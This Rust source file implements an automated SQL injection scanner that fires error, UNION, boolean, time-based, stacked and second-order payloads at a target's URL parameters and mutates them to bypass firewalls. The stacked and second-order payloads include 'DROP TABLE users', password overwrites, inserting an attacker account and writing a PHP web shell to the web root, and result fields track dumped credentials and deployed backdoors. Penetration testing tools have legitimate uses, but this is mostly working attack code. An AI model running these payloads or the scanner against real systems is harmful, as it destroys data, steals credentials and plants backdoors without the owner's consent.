use crate::http::client::HttpClient;
use crate::detection::analyzer::{Finding, Severity};
use crate::payload::sql_injection::SqlInjection;
use crate::scanner::db_fingerprinter::DatabaseFingerprinter;
use crate::ai::exploit_analyzer::ExploitAnalyzer;
use crate::ai::response_analyzer::ResponseAnalyzer;
use crate::ai::payload_mutator::PayloadMutator;
use crate::ai::pattern_learner::PatternLearner;
use std::collections::HashMap;
use std::time::Instant;
use anyhow::Result;

/// Enhanced SQL Injection scanner with AI-powered analysis
pub struct SqlInjectionScanner {
    client: HttpClient,
    findings: Vec<Finding>,
    exploit_analyzer: ExploitAnalyzer,
    response_analyzer: ResponseAnalyzer,
    payload_mutator: PayloadMutator,
    pattern_learner: PatternLearner,
    db_fingerprinter: DatabaseFingerprinter,
    exploitation_level: u8,
    silent_mode: bool,
    target: String,
}

#[derive(Debug, Clone)]
pub struct SQLInjectionResult {
    pub technique: String,
    pub success: bool,
    pub payload: String,
    pub response: String,
    pub data_extracted: bool,
    pub database_type: String,
    pub tables_found: Vec<String>,
    pub credentials_dumped: Vec<String>,
    pub backdoor_deployed: bool,
    pub hijacking_method: String,
}

#[derive(Debug, Clone)]
pub struct SQLInjectionSession {
    pub target_url: String,
    pub vulnerable_parameter: String,
    pub database_info: Option<crate::scanner::db_fingerprinter::DatabaseInfo>,
    pub successful_techniques: Vec<String>,
    pub extracted_data: HashMap<String, Vec<String>>,
    pub backdoors_deployed: Vec<String>,
    pub hijacked_sessions: Vec<String>,
    pub global_hijack_url: Option<String>,
    pub exploitation_complete: bool,
}

impl SqlInjectionScanner {
    /// Create a new enhanced SQL injection scanner
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        let db_fingerprinter = DatabaseFingerprinter::new(target.clone(), timeout_secs, insecure)?;
        
        Ok(Self {
            client,
            findings: Vec::new(),
            exploit_analyzer: ExploitAnalyzer::new(),
            response_analyzer: ResponseAnalyzer::new(0.7),
            payload_mutator: PayloadMutator::new(),
            pattern_learner: PatternLearner::new(0.1),
            db_fingerprinter,
            exploitation_level: 3,
            silent_mode: true,
            target,
        })
    }

    /// Perform comprehensive SQL injection scan
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Starting comprehensive SQL injection scan on {}", url);
        println!("[*] Target: {}, Exploitation level: {}, Silent mode: {}", 
            self.target, self.exploitation_level, self.silent_mode);
        
        let _findings: Vec<Finding> = Vec::new();
        
        // Phase 1: Database fingerprinting
        println!("[*] Phase 1: Database fingerprinting...");
        let mut _database_info = None;
        for param in params {
            if let Ok(Some(db_info)) = self.db_fingerprinter.fingerprint_database(url, param).await {
                _database_info = Some(db_info);
                break;
            }
        }

        // Phase 2: Deep vulnerability scanning with AI analysis
        println!("[*] Phase 2: Deep vulnerability scanning...");
        for param in params {
            println!("  [*] Scanning parameter: {}", param);
            
            if let Some(result) = self.deep_scan_parameter(url, param).await {
                self.findings.push(
                    Finding::new(
                        url,
                        Severity::Critical,
                        &format!("SQL Injection in parameter '{}'", param),
                        &format!("Parameter '{}' is vulnerable to {} SQL injection", param, result.technique)
                    )
                    .with_evidence(&format!("Payload: {}", result.payload))
                    .with_remediation("Use parameterized queries and input validation")
                );
            }
        }

        Ok(self.findings.clone())
    }

    /// Deep parameter scanning with AI-powered analysis
    async fn deep_scan_parameter(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let mut best_result = None;
        let mut _best_confidence = 0.0;

        // Test with error-based payloads
        if let Some(result) = self.test_advanced_error_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
                // Learn from successful pattern
                self.pattern_learner.learn_success("error_based", vec![param.to_string()]);
            }
        } else {
            // Learn from failed pattern
            self.pattern_learner.learn_failure("error_based");
        }

        // Test with UNION-based payloads
        if let Some(result) = self.test_union_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with boolean-based payloads
        if let Some(result) = self.test_advanced_boolean_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with time-based payloads
        if let Some(result) = self.test_advanced_time_based_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with stacked queries
        if let Some(result) = self.test_stacked_queries(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        // Test with second-order SQLi
        if let Some(result) = self.test_second_order_sqli(url, param).await {
            let confidence = self.analyze_exploit_success(&result).await;
            if confidence > _best_confidence {
                _best_confidence = confidence;
                best_result = Some(result);
            }
        }

        best_result
    }

    /// Advanced error-based SQL injection testing
    async fn test_advanced_error_based_sqli(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let mut base_payloads: Vec<String> = vec![
            "'".into(),
            "\"".into(),
            "' OR 1=1--".into(),
            "' OR 'a'='a".into(),
            "' UNION SELECT NULL--".into(),
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".into(),
        ];
        base_payloads.extend(SqlInjection::get_error_payloads());
        base_payloads.extend(SqlInjection::get_waf_bypass_payloads());

        // Generate AI-mutated payloads
        let mut all_payloads = Vec::new();
        for base_payload in base_payloads {
            let mutations = self.payload_mutator.mutate(&base_payload, 10);
            all_payloads.extend(mutations);
        }

        for payload in all_payloads {
            let start_time = std::time::Instant::now();
            let response = self.make_request(url, param, &payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                let response_time = start_time.elapsed().as_millis() as u64;
                
                // AI-powered response analysis
                let analysis = self.response_analyzer.analyze(&response_text, response_time);
                
                if analysis.is_vulnerable && analysis.confidence > 0.8 {
                    return Some(SQLInjectionResult {
                        technique: "advanced_error_based".to_string(),
                        success: true,
                        payload,
                        response: response_text.clone(),
                        data_extracted: response_text.len() > 500,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "error_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// UNION-based SQL injection testing
    async fn test_union_based_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        // First get baseline response
        let baseline = self.make_request(url, param, "baseline_test_123").await.ok()?;
        let baseline_text = baseline.body;
        let baseline_len = baseline_text.len();
        
        let union_payloads = vec![
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,username,password FROM users--",
            "' UNION SELECT 1,@@version,3,4--",
            "' UNION SELECT 1,database(),3,4--",
            "' UNION SELECT 1,user(),3,4--",
            "' UNION SELECT 1,table_name FROM information_schema.tables--",
            "' UNION SELECT 1,column_name FROM information_schema.columns--",
        ];

        for payload in union_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                let response_len = response_text.len();
                
                // Check for actual UNION success indicators - must be different from baseline
                // AND contain specific database indicators
                let has_db_indicator = response_text.contains("root:") || 
                   response_text.contains("admin:") ||
                   response_text.contains("mysql") ||
                   response_text.contains("postgresql") ||
                   response_text.contains("oracle") ||
                   response_text.contains("@@version") ||
                   response_text.contains("database()") ||
                   response_text.contains("information_schema");
                
                // Significant length change from baseline indicates data extraction
                let significant_change = response_len > baseline_len + 100;
                
                // Must have database indicator AND significant change, not just length > 200
                if has_db_indicator && significant_change && response_text != baseline_text {
                    return Some(SQLInjectionResult {
                        technique: "union_based".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: self.extract_tables_from_response(&response_text),
                        credentials_dumped: self.extract_credentials_from_response(&response_text),
                        backdoor_deployed: false,
                        hijacking_method: "union_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Advanced boolean-based SQL injection
    async fn test_advanced_boolean_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let boolean_payloads = vec![
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND (SELECT COUNT(*) FROM users)>0", "' AND (SELECT COUNT(*) FROM nonexistent_table)=0"),
            ("' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'", "' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='b'"),
        ];

        for (true_payload, false_payload) in boolean_payloads {
            let true_resp = self.make_request(url, param, true_payload).await.ok();
            let false_resp = self.make_request(url, param, false_payload).await.ok();
            
            if let (Some(true_resp), Some(false_resp)) = (true_resp, false_resp) {
                let true_text = true_resp.body;
                let false_text = false_resp.body;
                
                // Advanced comparison with AI analysis
                let true_analysis = self.response_analyzer.analyze(&true_text, 0);
                let false_analysis = self.response_analyzer.analyze(&false_text, 0);
                
                if (true_text.len() != false_text.len()) || 
                   (true_analysis.is_vulnerable != false_analysis.is_vulnerable) {
                    
                    return Some(SQLInjectionResult {
                        technique: "advanced_boolean".to_string(),
                        success: true,
                        payload: true_payload.to_string(),
                        response: true_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&true_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "boolean_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Advanced time-based SQL injection
    async fn test_advanced_time_based_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let time_payloads = vec![
            "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
            "'; WAITFOR DELAY '00:00:10'--",
            "'; SELECT pg_sleep(10);--",
            "'; DBMS_LOCK.SLEEP(10);--",
            "'; SELECT BENCHMARK(50000000,MD5('test'));--",
        ];

        for payload in time_payloads {
            let start = Instant::now();
            let response = self.make_request(url, param, payload).await;
            let duration = start.elapsed();
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Check for significant time delay
                if duration.as_secs() >= 8 {
                    return Some(SQLInjectionResult {
                        technique: "advanced_time_based".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: false,
                        hijacking_method: "time_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Stacked queries testing - requires confirmation of data modification
    async fn test_stacked_queries(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let stacked_payloads = vec![
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned');--",
            "'; UPDATE users SET password='pwned' WHERE id=1;--",
            "'; DROP TABLE users;--",
            "'; CREATE TABLE backdoor (cmd TEXT); INSERT INTO backdoor VALUES ('<?php system($_GET[\"cmd\"]); ?>');--",
        ];

        // Get baseline first
        let baseline = self.make_request(url, param, "baseline").await.ok()?;
        let baseline_text = baseline.body;

        for payload in stacked_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Stacked queries need actual error or success indicators, not just keywords
                // Check for database-specific error messages or actual data changes
                let has_sql_error = response_text.contains("SQL syntax") ||
                   response_text.contains("syntax error") ||
                   response_text.contains("ERROR:") ||
                   response_text.contains("ORA-") ||
                   response_text.contains("MySQL error");
                
                // Only flag if there's an actual SQL error (indicates parsing of stacked query)
                // OR if response is significantly different from baseline (indicates execution)
                let is_different = response_text != baseline_text;
                
                if has_sql_error && is_different {
                    return Some(SQLInjectionResult {
                        technique: "stacked_queries".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: payload.contains("backdoor"),
                        hijacking_method: "stacked_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Second-order SQL injection testing - requires verification
    async fn test_second_order_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
        let second_order_payloads = vec![
            "admin'; INSERT INTO logs (message) VALUES ((SELECT password FROM users WHERE id=1));--",
            "user' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
            "test' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
        ];

        // Get baseline for comparison
        let baseline = self.make_request(url, param, "baseline").await.ok()?;
        let baseline_text = baseline.body;

        for payload in second_order_payloads {
            let response = self.make_request(url, param, payload).await;
            
            if let Ok(resp) = response {
                let response_text = resp.body;
                
                // Second-order needs actual persistence indicators or SQL errors
                let has_sql_error = response_text.contains("SQL syntax") ||
                   response_text.contains("syntax error") ||
                   response_text.contains("ERROR:") ||
                   response_text.contains("ORA-") ||
                   response_text.contains("MySQL error");
                
                // Only flag if there's a SQL error indicating the complex query was parsed
                // AND response is different from baseline
                if has_sql_error && response_text != baseline_text {
                    return Some(SQLInjectionResult {
                        technique: "second_order".to_string(),
                        success: true,
                        payload: payload.to_string(),
                        response: response_text.clone(),
                        data_extracted: true,
                        database_type: self.extract_db_type_from_response(&response_text),
                        tables_found: Vec::new(),
                        credentials_dumped: Vec::new(),
                        backdoor_deployed: payload.contains("shell.php"),
                        hijacking_method: "second_order_injection".to_string(),
                    });
                }
            }
        }

        None
    }

    /// Extract database type from response
    fn extract_db_type_from_response(&self, response: &str) -> String {
        if response.contains("mysql") || response.contains("MySQL") {
            "MySQL".to_string()
        } else if response.contains("postgresql") || response.contains("PostgreSQL") {
            "PostgreSQL".to_string()
        } else if response.contains("sql server") || response.contains("Microsoft SQL Server") {
            "MSSQL".to_string()
        } else if response.contains("oracle") || response.contains("ORA-") {
            "Oracle".to_string()
        } else if response.contains("sqlite") {
            "SQLite".to_string()
        } else {
            "Unknown".to_string()
        }
    }

    /// Extract tables from response
    fn extract_tables_from_response(&self, response: &str) -> Vec<String> {
        let mut tables = Vec::new();
        
        for line in response.lines() {
            if line.contains("table") || line.contains("Table") {
                tables.push(line.to_string());
            }
        }
        
        tables
    }

    /// Extract credentials from response
    fn extract_credentials_from_response(&self, response: &str) -> Vec<String> {
        let mut credentials = Vec::new();
        
        for line in response.lines() {
            if line.contains(":") && (line.contains("admin") || line.contains("root") || line.contains("user")) {
                credentials.push(line.to_string());
            }
        }
        
        credentials
    }

    /// Helper method to make requests.
    /// Uses UrlUtil::inject_param to correctly handle URLs that already have
    /// query parameters — avoids the double-`?` bug from format!("{}?{}={}", ...).
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, &urlencoding::encode(value));
        let request = crate::http::request::HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Analyze exploit success using AI
    async fn analyze_exploit_success(&mut self, result: &SQLInjectionResult) -> f32 {
        let response_data = crate::ai::exploit_analyzer::ResponseData {
            payload: result.payload.clone(),
            response_code: 200,
            response_body: result.response.clone(),
            response_time: 100,
            headers: std::collections::HashMap::new(),
            success: result.success,
        };
        
        self.exploit_analyzer.analyze_response(response_data).await
    }

    /// Legacy methods for backward compatibility
    pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        self.comprehensive_scan(url, params).await
    }

    pub async fn comprehensive_scan_and_exploit(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        self.comprehensive_scan(url, params).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_enhanced_sqli_scanner_creation() {
        let scanner = SqlInjectionScanner::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(scanner.target, "https://example.com");
    }
}
